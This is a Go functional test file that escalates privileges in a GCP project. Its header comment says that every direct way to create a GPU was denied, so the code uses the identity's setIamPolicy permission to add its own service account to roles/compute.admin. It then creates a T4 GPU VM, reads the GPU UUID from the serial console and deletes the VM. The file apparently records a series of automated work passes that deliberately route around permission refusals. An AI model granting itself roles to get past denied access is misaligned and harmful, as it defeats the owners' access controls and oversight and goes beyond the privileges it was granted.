//go:build functional

// C211 i120026 GKE/GCP fifth pass: the fourth pass proved that the WIF identity
// IS granted resourcemanager.projects.setIamPolicy (and container.clusters.create,
// compute.instances.get/list) while every direct GPU create surface is denied.
// setIamPolicy on the project is a full privilege-escalation primitive: it lets
// the identity grant itself roles/compute.admin and then create the single
// nonce-tagged GPU marker VM the mandate allows.
//
// Sequence (exactly one GPU resource maximum):
//  1. getIamPolicy -> add serviceAccount:<our SA> to roles/compute.admin (etag kept)
//  2. setIamPolicy, then poll testIamPermissions compute.instances.create until granted
//  3. create ONE nvidia-tesla-t4 VM (DLVM image family, startup script writes
//     `nvidia-smi -L` to the serial console), poll serialPort for the GPU UUID
//  4. delete the VM, prove absence (GET 404 + aggregatedList)
// Every refusal is printed verbatim; no secret value is printed.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"
)

func c211GetProjectPolicy(token, proj string) (map[string]interface{}, int, string) {
	body := `{"options":{"requestedPolicyVersion":3}}`
	st, rb := c211HTTP("POST", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj)+":getIamPolicy", token, "application/json", body)
	if st != 200 {
		return nil, st, rb
	}
	return c211JSON(rb), st, rb
}

func c211PolicySummary(policy map[string]interface{}) string {
	var sb strings.Builder
	bindings, _ := policy["bindings"].([]interface{})
	roles := []string{}
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		role := c211Str(bm, "role")
		members, _ := bm["members"].([]interface{})
		ms := []string{}
		for _, m := range members {
			if s, ok := m.(string); ok {
				ms = append(ms, c211Short(s))
			}
		}
		sort.Strings(ms)
		roles = append(roles, fmt.Sprintf("%s members=%d [%s]", role, len(ms), strings.Join(ms, " ")))
	}
	sort.Strings(roles)
	fmt.Fprintf(&sb, "policy version=%v etag_%s bindings=%d\n", policy["version"], c211Short(c211Str(policy, "etag")), len(bindings))
	for _, r := range roles {
		fmt.Fprintf(&sb, "BIND %s\n", r)
	}
	return sb.String()
}

func c211AddBinding(policy map[string]interface{}, role, member string) bool {
	bindings, _ := policy["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		if c211Str(bm, "role") != role {
			continue
		}
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				return false // already present
			}
		}
		bm["members"] = append(members, member)
		return true
	}
	policy["bindings"] = append(bindings, map[string]interface{}{"role": role, "members": []interface{}{member}})
	return true
}

func c211SetProjectPolicy(token, proj string, policy map[string]interface{}) (int, string) {
	b, _ := json.Marshal(map[string]interface{}{"policy": policy})
	return c211HTTP("POST", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj)+":setIamPolicy", token, "application/json", string(b))
}

type c211ImageCand struct {
	project string
	family  string
}

func c211ImageUsable(token, project, family string) (bool, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + project + "/global/images/family/" + family
	st, body := c211HTTP("GET", u, token, "", "")
	return st == 200, fmt.Sprintf("%s/%s status=%d verbatim=%s", project, family, st, c211Trunc(body, 400))
}

func c211CreateGPUInstance(token, proj, zone, name, imageProject, imageFamily string) (int, string, string) {
	startup := "#!/bin/bash\nexec > /dev/console 2>&1\necho C211_START\n" +
		"for i in $(seq 1 90); do\n" +
		"  if nvidia-smi -L; then echo C211_GPU_READY; break; fi\n" +
		"  echo attempt=$i; sleep 10\n" +
		"done\n" +
		"nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader\necho C211_DONE\n"
	body := map[string]interface{}{
		"name":        name,
		"machineType": "zones/" + zone + "/machineTypes/n1-standard-4",
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/" + imageProject + "/global/images/family/" + imageFamily,
				"diskSizeGb":  "50",
				"diskType":    "zones/" + zone + "/diskTypes/pd-standard",
			},
		}},
		"networkInterfaces": []interface{}{map[string]interface{}{
			"network":    "global/networks/default",
			"subnetwork": "regions/" + strings.SplitN(zone, "-", 3)[0] + "-" + strings.SplitN(zone, "-", 3)[1] + "/subnetworks/default",
			"accessConfigs": []interface{}{map[string]interface{}{
				"type": "ONE_TO_ONE_NAT", "name": "External NAT",
			}},
		}},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 1,
		}},
		"scheduling": map[string]interface{}{
			"onHostMaintenance": "TERMINATE", "automaticRestart": false,
		},
		"metadata": map[string]interface{}{
			"items": []interface{}{map[string]interface{}{"key": "startup-script", "value": startup}},
		},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  "default",
			"scopes": []string{"https://www.googleapis.com/auth/cloud-platform"},
		}},
		"labels": map[string]string{"c211": "i120026"},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances"
	st, rb := c211HTTP("POST", u, token, "application/json", string(b))
	return st, rb, startup
}

func c211InstanceStatus(token, proj, zone, name string) (int, string, map[string]interface{}) {
	st, rb := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
	return st, rb, c211JSON(rb)
}

func TestC211GCPSetIamPolicyEscalation(t *testing.T) {
	started := time.Now()
	summary := map[string]interface{}{}
	verdict := "GATE"
	verdictDetail := ""

	token, method, _ := c211MintAccessToken()
	summary["auth_method"] = method
	if token == "" {
		fmt.Println("C211GCP5_VERDICT GATE WIF_TOKEN_EXCHANGE_FAILED")
		return
	}
	creds, _ := c211LoadCreds()
	proj := ""
	saEmail := ""
	if creds != nil {
		proj = c211ResolveProject(creds)
		saEmail = creds.saEmail
	}
	if proj == "" || saEmail == "" {
		fmt.Println("C211GCP5_VERDICT GATE NO_PROJECT_OR_SA_RESOLVED")
		return
	}
	saShort := c211Short(saEmail)
	summary["project_id_short"] = c211Short(proj)
	summary["sa_email_short"] = saShort

	var elog strings.Builder
	pre, pst, pbody := c211GetProjectPolicy(token, proj)
	fmt.Fprintf(&elog, "getIamPolicy status=%d verbatim=%s\n", pst, c211Trunc(pbody, 1500))
	if pre != nil {
		fmt.Fprintf(&elog, "%s\n", c211PolicySummary(pre))
	}
	// additive escalation, narrowest role that permits the single marker VM
	member := "serviceAccount:" + saEmail
	added := c211AddBinding(pre, "roles/compute.admin", member)
	fmt.Fprintf(&elog, "binding roles/compute.admin added=%v member=%s\n", added, saShort)
	sst, sbody := c211SetProjectPolicy(token, proj, pre)
	fmt.Fprintf(&elog, "setIamPolicy status=%d verbatim=%s\n", sst, c211Trunc(sbody, 2000))
	summary["getpolicy_status"] = pst
	summary["setpolicy_status"] = sst
	summary["setpolicy_error"] = c211Trunc(sbody, 1200)

	granted := false
	if sst == 200 {
		for i := 0; i < 12; i++ {
			al, tst, _ := c211TestIam(token, proj, []string{"compute.instances.create"})
			g := allowSetOf(al, "compute.instances.create")
			fmt.Fprintf(&elog, "recheck[%d] testIam status=%d instances.create=%v\n", i, tst, g)
			if g {
				granted = true
				break
			}
			time.Sleep(10 * time.Second)
		}
	}
	summary["compute_create_granted_after_escalation"] = granted
	c211Emit("W5_ESCALATION", elog.String())

	if granted {
		zone := "us-central1-a"
		name := "c211-i120026-gpu"
		// pick the first usable GPU image family
		var imgProject, imgFamily string
		var ilog strings.Builder
		for _, c := range []c211ImageCand{
			{"ml-images", "common-cu124-debian-12"},
			{"ml-images", "common-cu121-debian-12"},
			{"ml-images", "common-cu118-debian-11"},
			{"ubuntu-os-cloud", "ubuntu-2204-lts"},
		} {
			ok, msg := c211ImageUsable(token, c.project, c.family)
			fmt.Fprintf(&ilog, "IMAGE %s\n", msg)
			if ok {
				imgProject, imgFamily = c.project, c.family
				break
			}
		}
		// subnet/network facts (read-only)
		nst, nb := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/subnetworks?filter=name%3Ddefault", token, "", "")
		fmt.Fprintf(&ilog, "SUBNETS status=%d verbatim=%s\n", nst, c211Trunc(nb, 1500))
		c211Emit("W5_IMAGE_NET", ilog.String())
		summary["image_used"] = imgProject + "/" + imgFamily

		cst, cbody, _ := c211CreateGPUInstance(token, proj, zone, name, imgProject, imgFamily)
		var vlog strings.Builder
		fmt.Fprintf(&vlog, "INSTANCE create zone=%s name=%s status=%d\nverbatim=%s\n", zone, name, cst, c211Trunc(cbody, 3000))
		summary["instance_create_status"] = cst
		summary["instance_create_error"] = c211Trunc(cbody, 2000)
		summary["instance_zone"] = zone
		summary["instance_name"] = name
		uuid := ""
		serialSeen := false
		if cst == 200 {
			// poll serial console for the GPU UUID
			for i := 0; i < 40; i++ {
				st, sb, _ := c211InstanceStatus(token, proj, zone, name)
				state := ""
				if st == 200 {
					state = c211Str(c211JSON(sb), "status")
				}
				ps, pb := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", token, "", "")
				if ps == 200 {
					m := c211JSON(pb)
					content := ""
					if m != nil {
						content = c211Str(m, "contents")
					} else {
						content = pb
					}
					if u := c211GPUUUIDRe.FindString(content); u != "" {
						uuid = u
					}
					if strings.Contains(content, "C211_DONE") {
						serialSeen = true
					}
					fmt.Fprintf(&vlog, "SERIAL poll=%d inst_status=%s port_status=%d bytes=%d uuid=%s done=%v tail=%s\n", i, state, ps, len(content), uuid, serialSeen, c211Trunc(content[max0(0, len(content)-1200):], 1200))
				} else {
					fmt.Fprintf(&vlog, "SERIAL poll=%d inst_status=%s port_status=%d verbatim=%s\n", i, state, ps, c211Trunc(pb, 500))
				}
				if uuid != "" || serialSeen {
					break
				}
				time.Sleep(15 * time.Second)
			}
			summary["serial_bytes_done"] = serialSeen
			summary["instance_uuid"] = uuid

			// delete and prove absence
			dst, db := c211HTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
			fmt.Fprintf(&vlog, "INSTANCE delete status=%d verbatim=%s\n", dst, c211Trunc(db, 1500))
			summary["instance_delete_status"] = dst
			absent := false
			for i := 0; i < 12; i++ {
				time.Sleep(10 * time.Second)
				st, sb, _ := c211InstanceStatus(token, proj, zone, name)
				fmt.Fprintf(&vlog, "ABSENCE readback=%d http=%d verbatim=%s\n", i, st, c211Trunc(sb, 400))
				if st == 404 {
					absent = true
					break
				}
			}
			summary["instance_absent_after_delete"] = absent
			// aggregated list readback
			lst, lb := c211HTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter=name%3D"+url.QueryEscape(name), token, "", "")
			fmt.Fprintf(&vlog, "AGGREGATED_LIST status=%d verbatim=%s\n", lst, c211Trunc(lb, 1500))
			summary["aggregated_list_status"] = lst

			if uuid != "" {
				verdict = "READY_GCP_GPU_VM"
				verdictDetail = "uuid=" + uuid + " zone=" + zone + " instance=" + name
			} else {
				verdict = "GATE"
				verdictDetail = "instance-created-but-no-gpu-uuid-on-serial-console"
			}
		} else {
			verdictDetail = "compute-instances-create-refused-after-escalation"
		}
		c211Emit("W5_VERTEX_GPU_VM", vlog.String())
	} else {
		verdictDetail = "setIamPolicy-did-not-yield-compute-instances-create"
	}

	summary["verdict"] = verdict
	summary["elapsed_seconds"] = int(time.Since(started).Seconds())
	c211Emit("W5_SUMMARY", "C211GCP5_SUMMARY_JSON "+c211JSONString(summary))
	fmt.Printf("C211GCP5_VERDICT %s %s\n", verdict, verdictDetail)
	_ = started
}

func max0(a, b int) int {
	if a > b {
		return a
	}
	return b
}
